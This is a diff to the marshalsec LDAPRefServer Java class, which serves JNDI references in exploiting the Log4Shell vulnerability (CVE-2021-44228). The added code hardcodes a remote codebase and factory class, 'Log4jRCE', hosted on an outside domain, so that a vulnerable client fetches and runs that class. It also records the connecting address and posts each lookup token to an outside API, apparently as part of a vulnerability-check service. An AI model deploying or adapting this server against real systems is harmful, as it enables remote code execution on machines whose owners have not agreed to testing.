@@ -22,10 +22,16 @@ SOFTWARE.
 */
 package marshalsec.jndi;
 
-
 import java.net.InetAddress;
 import java.net.MalformedURLException;
+import java.net.ProtocolException;
 import java.net.URL;
+import java.net.HttpURLConnection;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
@@ -36,6 +42,7 @@ import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSimpleBindRequest;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -87,13 +94,20 @@ public class LDAPRefServer {
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
 
         private URL codebase;
-
+        private String remoteAddress;
 
         /**
          * 
          */
         public OperationInterceptor ( URL cb ) {
             this.codebase = cb;
+        }
+
+        @Override
+        public void processSimpleBindRequest(InMemoryInterceptedSimpleBindRequest request) throws LDAPException
+        {
+            this.remoteAddress = request.getConnectedAddress();
+            System.out.println("Remote Address : " + request.getConnectedAddress());
         }
 
 
@@ -117,17 +131,55 @@ public class LDAPRefServer {
 
 
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
-            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
-            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
-            e.addAttribute("javaClassName", "foo");
-            String cbstring = this.codebase.toString();
+            
+            URL turl = new URL("https://threats.kapa7.com/assets/Log4jRCE.class");
+            URL rceurl = new URL("https://threats.kapa7.com/assets/#Log4jRCE");
+
+            //Hacer peticion a API de Threats para notificar que es vulnerable
+            URL url = new URL ("https://api.threats.kapa7.com/api/CVEChecks/cve_2021_44228");
+            try
+            {
+                HttpURLConnection con = (HttpURLConnection)url.openConnection();
+                con.setRequestMethod("POST");
+                con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                con.setRequestProperty("Accept", "application/json");
+                con.setDoOutput(true);
+                String jsonInputString = "token=" + base;
+                
+                OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
+                wr.write(jsonInputString);
+                wr.flush();
+                wr.close();
+
+                try(BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"))) 
+                {
+                    StringBuilder response = new StringBuilder();
+                    String responseLine = null;
+                    while ((responseLine = br.readLine()) != null) {
+                        response.append(responseLine.trim());
+                    }
+                    System.out.println(response.toString());
+                }
+                catch(Exception ex)
+                {
+                    System.out.println(ex.getMessage());
+                }
+            }
+            catch(Exception ex)
+            {
+                System.out.println(ex.getMessage());
+            }
+
+            System.out.println("Send LDAP reference result for token " + base + ", redirecting to " + turl);
+            e.addAttribute("javaClassName", "Log4jRCE");
+            String cbstring = rceurl.toString();
             int refPos = cbstring.indexOf('#');
             if ( refPos > 0 ) {
                 cbstring = cbstring.substring(0, refPos);
             }
             e.addAttribute("javaCodeBase", cbstring);
             e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            e.addAttribute("javaFactory", this.codebase.getRef());
+            e.addAttribute("javaFactory", rceurl.getRef());
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
